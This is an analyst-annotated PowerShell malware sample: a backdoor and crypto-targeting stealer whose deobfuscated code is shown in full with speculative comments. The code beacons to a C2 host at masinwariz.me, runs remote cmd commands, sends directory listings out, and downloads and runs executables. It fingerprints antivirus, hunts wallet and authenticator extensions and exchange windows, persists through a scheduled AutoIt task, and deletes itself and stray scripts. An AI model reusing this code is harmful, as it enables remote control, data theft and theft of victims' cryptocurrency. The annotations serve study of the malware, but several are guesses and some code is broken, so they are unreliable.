:: Mutex boolean
$mutexBool = $false;

:: Set mutex to true assigning a unique ID to it
$mutex = [System.Threading.Mutex]::new($true, "acb2f45f62c34c94bbd6e86734eb01a1", [ref]$mutexBool);


:: If could not get a handle on mutex try again in 10s
if ($mutexBool -eq $false) {
    Start-Sleep -Seconds 10;
    return;
}

:: Get Windows major:minor versions
$getWindowsVersion = [System.Environment]::OSVersion.Version.Major.ToString() + "." + [System.Environment]::OSVersion.Version.Minor.ToString();

:: ??
$global:worker = $true;


:: Returns specified Windows ENV variables
function getSpecifiedWindowsENV([string] $str) {
    return [System.Environment]::ExpandEnvironmentVariables("%" + $str + "%")
}

:: Recon using Get-WmiObject
function executeWmiObject([string] $class, [string] $valssue) {
    $queryResult = $null;
    $executeWMI = (Get-wmiobject -Class $class) ;

    :: Get first result only
    foreach ($item in $executeWMI) {
        $queryResult = $item[$valssue];
        break;
    }

    :: If no result, then generate a GUID - assuming so AV doesn't catch?
    if($queryResult -eq $null)
    {
       $queryResult = [Guid]::NewGuid().ToString();
    }
    return $queryResult;
}

function getVolumeSerialNumber() {
    return (executeWmiObject 'win32_logicaldisk' "VolumeSerialNumber") 
}


function getOSVersionName() {
    return (executeWmiObject 'Win32_OperatingSystem' "Caption") 
}


function getSystemBits() {
    return (executeWmiObject 'Win32_Processor' "AddressWidth") 
}

:: Check if AV is enabled or disabled
function getAVStatus([uint32]$state) {
    [byte[]] $bytes = [System.BitConverter]::GetBytes($state);
    if (($bytes[1] -eq 0x10) -or ($bytes[1] -eq 0x11)) {
        return "Enabled";
    }
    elseif (($bytes[1] -eq 0x00) -or ($bytes[1] -eq 0x01) -or ($bytes[1] -eq 0x20) -or ($bytes[1] -eq 0x21)) {
        return "Disabled";
    }
    return "Unknown";
}

:: Return AV name and state
function getAVNameAndState() {
    :: SecurityCenter is older windows
    :: SecurityCenter2 is newer windows
    $avs = Get-wmiobject -Namespace "root\SecurityCenter" -Class "AntiVirusProduct";
    $avs += Get-wmiobject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct";
    $avf = New-Object Collections.Generic.List[string];

    :: For each found av in directories searched above
    foreach ($av in $avs) {
        $enabled = (getAVStatus $av.productState);
        $avf.Add($av.displayName + " [$enabled]")
    }
    return [string]::Join(", ", $avf.ToArray())
}

:: Remove '/' and capitalize first letter
function cleanStrAndCapitalize([string]$str) {

    if ($str.Length -eq 0) {
        return "";
    }
    $str = $str.Replace("/", "");
    return ($str.Substring(0, 1).ToUpper() + $str.Substring(1));
}

:: Returns list of drives available, i.e C:
function getSystemDrives {
     $logical_disks = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Select-Object -Property DeviceID, VolumeName

     $disks = ""
     foreach($logical_disk in $logical_disks) {
          $disks += $logical_disk.DeviceID + ';'
     }
     return $disks;
}

:: Enumerate files & directories
function enumerateFilesDirectories($Path) {

    # Check if the specified path exists
    if (-Not (Test-Path $Path)) {
        return @()
    }
   
   :: if directory
    $directories = @(Get-ChildItem -Path $Path -Force -Directory | ForEach-Object {
       [PSCustomObject]@{ 
            name = $_.FullName
            type = "DIRECTORY"
        }
    })

    :: if file
    $files = @(Get-ChildItem -Path $Path -Force -File | ForEach-Object {
       [PSCustomObject]@{
        name = $_.FullName
        type = "FILE"
        }
     })
    return $directories + $files;
}

:: Exfiltrate data to remote server masinwariz.me
function SendFileBrowserContent($Path, $Content) {

    :: Endpoint setFileBrowserContent specified
    $URL = "https://masinwariz.me/connect/setFileBrowserContent";

    :: Sets tls or something depending on os versin != 6.1, for TLS probably
    if ($osVersion -ne "6.1") {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }
    $data = @{
        path = $Path
        content = $Content
        hwid = (executeWmiObject 'win32_logicaldisk' "VolumeSerialNumber")
    }
     $b64 = @{
        content = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes( (ConvertTo-Json $data) ))
     }
     $json = ConvertTo-Json $b64
     $headers = @{
      'Content-Type' = 'application/json'
     }
    $response = Invoke-RestMethod -Uri $URL -Method Post -Body $json -Headers $headers
}

:: Custom user agent to exfiltrate/track users
function userAgentTrackVictims {
    $fqzlkjdfjsdfssject = getFirefoxChromeWallets;
    return $uniqueComputerID + $backslash + (cleanStrAndCapitalize (getSpecifiedWindowsENV "COMPUTERNAME")) +
        $backslash + (cleanStrAndCapitalize (getSpecifiedWindowsENV "USERNAME")) + $backslash +
        (cleanStrAndCapitalize (getOSVersionName)) + " [" + (getSystemBits) + "]" + $backslash +
        (cleanStrAndCapitalize (getAVNameAndState)) + $backslash + $fqzlkjdfjsdfssject + $backslash + (getSystemDrives) +
        $backslash + [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($env:APPDATA))
}

:: Check in with C2 server listening for commands
function checkInC2Server($data, $notify) {
    :: Connect endpoint ; maybe C2
    $URL = "https://masinwariz.me/connect";
    :: Some TLS thing again probably
    if ($getWindowsVersion -ne "6.1") {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }

    :: Create webclient and set headers of request
    $webClientObject = New-Object System.Net.WebClient;
    $useragent = userAgentTrackVictims;
    $webClientObject.Headers['X-User-Agent'] = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($useragent));

    :: ??
    if ($notify) {
        $webClientObject.Headers['X-notify'] = $notify
    }

    :: Send data to server
    $Response = $webClientObject.UploadString($URL, $data);

    :: Listening for commands?
    $workerRequest = $webClientObject.ResponseHeaders["worker"];

    :: ?? disable or enable worker if we get a command from server?
    if ($workerRequest -eq "0") {
        $global:worker = $false;
    }
    else {
        $global:worker= $true;
    }
    return $Response.ToString()
}

:: Download file from remote server
function getFileFromRemoteServer([string]$URL, [string]$Filename) {
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/599.99 (KHTML, like Gecko) Chrome/81.0.3999.199 Safari/599.99";
    :: TLS probably
    if ($getWindowsVersion -ne "6.1") {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
        :: Download from URL, Filename
        $AqQdzQSD = Invoke-WebRequest -Uri $URL -OutFile $Filename -UserAgent $UserAgent -Method 'GET'
    }
    :: Call again? Looks like fallback
    else {
        $webClientObject = New-Object System.Net.WebClient;
        $webClientObject.Headers['User-Agent'] = $UserAgent;
        $webClientObject.getFileFromRemoteServer($URL, $Filename);
    }
}

:: Call to download file from remote server
function callGetFileFromRemoteServer($url, $path, $wait) {
    getFileFromRemoteServer $url $path
}

:: Remove specified object
function killItself($quit) {
    :: Removed object to cover its tracks
    Remove-Item -Path $currentScriptFullPath;
    :: Exit process true
    if ($quit) {
        exit(0);
    }
}

:: Check if command is available
function checkAvailableCommand([string] $func) {
    try {
        $AqQdzQSD = Get-Command  -Name $func;
        :: If command was found
        if ($ret) {
            return $true
        }
    }
    catch {
    }
    :: If command was not found
    return $false
}

:: Create Get-Clipboard and Set-Clipboard if these are not available
:: Steals user data
if (!(checkAvailableCommand "Get-Clipboard") -or !(checkAvailableCommand "Set-Clipboard")) {
    Add-Type -AssemblyName PresentationFramework;

    function Get-Clipboard($Format) {
        return [System.Windows.Clipboard]::GetText();
    }

    function Set-Clipboard($valssue) {
        [System.Windows.Clipboard]::SetText($valssue)
    }
}

:: Send to C2 of any available cryptocurrency applications open
function log_event([string] $coin, [string] $valssue) {
    checkInC2Server "" ($coin + " - " + $valssue)
} 

:: Main
:: Capabilities
    :: Command execution
    :: Data exfiltration, specifically of browser or other specified dir
    :: Download EXE and execute, could be persistence or other
    :: Self destruct
    :: Check if computer has crypto application installed
function main {
    $delimiter = "|V|";
    $backslash = "\";
    $ETP_TM_ID = "ETP_TM";
    $uniqueComputerID = $ETP_TM_ID + '_' + (getVolumeSerialNumber);
    $tempDirectoryPath = (getSpecifiedWindowsENV "temp") + $backslash;
    $currentScriptFullPath = $scriptItem.FullName;
    $currentScriptName = $scriptItem.Name;
    $powerShell = "powershell.exe";

    :: Looks like some sort of beacon eh? of a C2 application. Would not be surprised if its sliver ... bcs of its popularity
    :: Get instructions from C2, or check if crypto application is installed on local host
    while ($true) {
        try {
            :: Get response from server
            [string]$c2Instructions = checkInC2Server;

            :: String split commands from C2 server
            [string[]] $sep = $delimiter;
            $c2SplitCommands = $c2Instructions.Split( $sep, [StringSplitOptions]::None);
            

            $baseExecutionInstruction = $c2SplitCommands[0];
            $executionFirstArgument = $c2SplitCommands[1];
        
            :: If C2 instructed to use CMD
            :: Execute commands using CMD
            if ($baseExecutionInstruction -eq "Cmd") {
                :: Pass command to CMD, this is command execution
               $output = cmd.exe /c $executionFirstArgument
            }

            :: If C2 instructed to use browser
            :: Exfiltrate browser (or any other directory) data to C2
            if($baseExecutionInstruction -eq "Browser") {
              $browserDirectoryPath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($executionFirstArgument))
              $filesFoundBrowser = @(enumerateFilesDirectories -Path $browserDirectoryPath)
              SendFileBrowserContent -Path $browserDirectoryPath -Content $filesFoundBrowser
            }

            :: If C2 instructed to download an EXE file
            :: Download file from remote address, and execute it
            if ($baseExecutionInstruction -eq "DwnlExe") {
                $path = $tempDirectoryPath + $c2SplitCommands[2];
                $cmd = $c2SplitCommands[3] + $path;
                callGetFileFromRemoteServer $c2SplitCommands[1] $path $true;
                Start-Sleep 1
                cmd.exe /c $cmd
            }

            :: If C2 instructed self destruction, kill itself and files.
            if ($baseExecutionInstruction -eq "SelfRemove") {
                killItself $true
            } 
        }
       catch {}
        try {
            doesCryptoApplicationExist
        }
        catch
        {}
        Start-Sleep 1
    }
}

:: Returns list of extensions found in host matching crypto wallets
function getFirefoxChromeWallets {
    $listOfCryptoApplicationsAndDirectoriesAndBrowsers = ConvertFrom-Json $pathdata
    :: Collection of firefox extensions available on host device
    $Collections.Generic.List[string] = New-Object ("{7}{5}{2}{0}{4}{1}{6}{3}" -f'ions.Generic.L','ri','ct','g]','ist[st','le','n','Col');

    :: Get cryptowallets extensions
    try {
        :: Get firefox extensions in main profile
        $firefoxExtensions = Get-ChildItem -Path "$env:appdata\Mozilla\Firefox\Profiles\*.xpi" -Recurse -Force;

        :: Find cryptowallet firefox extensions
        Foreach ($extension in $firefoxExtensions) {
            :: Metamask
            if ($extension.Name -match "ebextension@metamask.io.xpi") {
                try {
                    [string] $OIiohjdid = "metamask-F"
                    $Collections.Generic.List[string].Add($OIiohjdid)
                }
                catch {
                    Write-Host "error"
                }
            }
            :: Ronin Wallet
            if ($extension.Name -match "ronin-wallet@axieinfinity.com.xpi") {
                try {
                    [string] $Plkqjks = "Ronin-f"
                    $Collections.Generic.List[string].Add($Plkqjks)
                }

                catch {
                    Write-Host "error"
                }
            }
            :: Rainbow.me some fucking crypto game? seriously?
            if ($extension.Name -match "browserextension@rainbow.me.xpi") {
                try {
                    [string] $Plkqjks = "rainbo-f"
                    $Collections.Generic.List[string].Add($Plkqjks)
                }
                catch {
                    Write-Host "error"
                }
            }
            :: Two factor authentication
            if ($extension.Name -match "authenticator@mymindstorm.xpi") {
                try {
                    [string] $Plkqjks = "authent-f"
                    $Collections.Generic.List[string].Add($Plkqjks)
                }
                catch {

                    Write-Host "error"
                }
            }
        }
    }
    catch {}

    :: Grab and store chrome extensions
    foreach ($entry in $listOfCryptoApplicationsAndDirectoriesAndBrowsers) {
        :: ?? Some more paths not sure for what
        $directory = [System.Environment]::ExpandEnvironmentVariables($entry.root);
        foreach ($target in $entry.targets) {
            if ((Test-Path -Path (Join-Path -Path $directory -ChildPath $target.path))) {
                $Collections.Generic.List[string].Add($target.name)
            }
        }

        :: If google chrome profile
        if ($directory -like "*Chrome\User Data\Default*") {
            $splitPath = $directory -split '\\'
            $chrpth = ($splitPath[0..($splitPath.Length - 3)] -join '\')
            :: Google chrome extensions in profiles found
            $profiles = Get-ChildItem -Path $chrpth -Directory -Recurse | Where-Object { $_.Name -like "Profile*" } | ForEach-Object { Join-Path -Path $_.FullName -ChildPath "Extensions" }

            :: If chrome extension found, store name
            foreach($profile in $profiles) {
                $splitProfile = $profile -split "\\"
                $chromeExtensionName = $splitProfile[$splitProfile.Length - 2];
                foreach ($target in $entry.targets) {
                    if (Test-Path -Path (Join-Path -Path $profile -ChildPath $target.path)) {
                        $Collections.Generic.List[string].Add("Chrome " +$chromeExtensionName + " " + $target.name)
                    }
                }
            }
         }
    }
    :: Base64 collection of extensions, chrome or firefox based
    $walletExtensionCollection = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([string]::Join("`n", $Collections.Generic.List[string])));
    return $walletExtensionCollection;
}

:: Check if crypto application exists on host device
function doesCryptoApplicationExist {
    $cryptoApplication = @('binance', 'coinbase','blockchain.com','Kraken','uphold','okex','Gemini','bitcoinira','paybit','bitpay','coinmarketcap','tradingview','BitMart.com','nicehash','Cryptocurrency','mexc')
    :: Backticks used to bypass EDR(?)
    $getAllProcessWindowTitles = (GE`T-`proce`SS | wH`E`Re-oBJeCT { $_.MainWindowTitle -ne "" } | sEle`CT`-o`BjeCT MainWindowTitle)

    :: Check if process name is a crypto application, log to C2 of any
    foreach ($windowTitle in $getAllProcessWindowTitles) {
        [string]$window = $windowTitle.MainWindowTitle;
        foreach ($application in $cryptoApplication) {
            if ($window.ToLower().Contains($application)) {
                log_event 'app' ($application + "[" + $window + "]")
            }
        }
    }
}

:: Persistence using AutoIt
:: Check if scheduled task is running, if not run it
    :: Task name is computer name
    :: Executes AutoIt3.exe in current directory
    :: Scheduled task every 11 minutes
function Ensure-ScheduledTask {
    $ComputerName = $env:COMPUTERNAME
    $AutoPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows')
    $ScriptPath = [System.IO.Path]::Combine($AutoPath, "$ComputerName.au3")
    $TaskName = $ComputerName

    # Check if the task already exists
    $taskExists = schtasks /query /fo LIST /v | Where-Object { $_ -match "TaskName:\s+$TaskName" }

    :: If schtask exists, run
    if ($taskExists) {
        # Check if the task is already running
        $taskRunning = schtasks /query /tn $TaskName /fo LIST /v | Select-String "Status:\s+Running"

        :: If scheduled & running or not running
        if ($taskRunning) {
            Write-Host "Scheduled task '$TaskName' is already running. Skipping execution."
        } else {
            Write-Host "Scheduled task '$TaskName' exists but is not running. Ensuring it is scheduled."
        }

    :: If schtask dose not exist, create new scheduled task
    :: Scheduled task: runs AutoIt3.exe in current directory with ComputerName as name, AutoIt3.exe as command, every 11 minutes 
    } else {
        # Task doesn't exist, create it
        $Command = "`"$AutoPath\\AutoIt3.exe`" `"$ScriptPath`""
        try {
            $output = schtasks /create /tn $TaskName /tr $Command /sc minute /mo 11 /f 2>&1

            Write-Host "Scheduled task '$TaskName' created successfully."
        } catch {

            Write-Host "Error creating the scheduled task: $_"
        }
    }
}

# Execute the function as the first step
Ensure-ScheduledTask

# Continue execution of other functions
Write-Host "Continuing script execution..."

:: Remove PS1 files from temp, localappdata (sub)directories
function Remove-PS1FilesFromTemp {
    $tempPath = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Temp"
    $localAppDataPath = $env:LOCALAPPDATA

    # Delete .ps1 files from Temp and its subdirectories
    Get-ChildItem -Path $tempPath -Filter *.ps1 -Recurse -Force | Remove-Item -Force -ErrorAction SilentlyContinue

    # Delete .ps1 files from LocalAppData and its subdirectories
    Get-ChildItem -Path $localAppDataPath -Filter *.ps1 -Recurse -Force | Remove-Item -Force -ErrorAction SilentlyContinue
}

:: Run main forever
while ($true) {
    try {
        main
    }
    catch {
    }
}

:: Release mutex
$mutex.ReleaseMutex()

:: Who knows.
Start-Job -ScriptBlock {
    Your-LastFunction
}